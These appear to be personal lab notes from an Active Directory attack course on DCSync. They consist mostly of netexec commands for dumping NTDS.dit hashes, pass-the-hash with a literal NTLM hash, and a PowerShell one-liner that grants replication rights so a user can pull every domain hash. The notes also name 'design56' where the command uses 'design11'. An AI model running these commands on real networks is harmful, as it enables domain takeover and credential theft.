**DCSync**
![](assets/Pasted%20image%2020260717082704.png)

dump NTDS.dit with netexec
`nxc smb <IP> -u <user> -p <pass> --ntds`
- dump a single user
`--ntds --user <user>`
- include Kerberos keys
`--ntds --kerberos-keys`
- include password history
`--ntds-history`


**Learning objective 13**
![](assets/Pasted%20image%2020260717084241.png)

Impersonate DA
`proxychains -q nxc smb <IPP> -u Administrator -H <hash> --local-auth -M schtask_as -o USER=adm_david.miller SILENTCOMMAND=True CMD='powershell.exe "Invoke-Command -ComputerName Auto-DC01 -ScriptBlock (ping 172.16.100.1)"`

Add Replication Rights
`proxychains -q nxc smb <IP> -u <Administrator> -H <hash> --local-auth -M schtask_as -o USER=adm_david.miller SILENTCOMMAND=True CMD=<command>`
- check lab manual for the command
![](assets/Pasted%20image%2020260717084602.png)
```
proxychains -q nxc smb 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth -M schtask_as -o USER=adm_david.miller CMD='powershell.exe "Invoke-Command -ComputerName AUTO-DC01 -ScriptBlock {$r=[ADSI]\"LDAP://DC=auto,DC=corp\"; \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\",\"89e95b76-444d-4c62-991a-0facbeda640c\" | ForEach-Object { $r.ObjectSecurity.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]\"AUTO\design11\",\"ExtendedRight\",\"Allow\",[Guid]$_))) }; $r.CommitChanges()}"' SILENTCOMMAND=True
```
- change "design56" to whatever user you need

Dump NTDS to get DA hash
`proxychains -q nxc smb <IP> -u <user> -p <pass> --ntds`
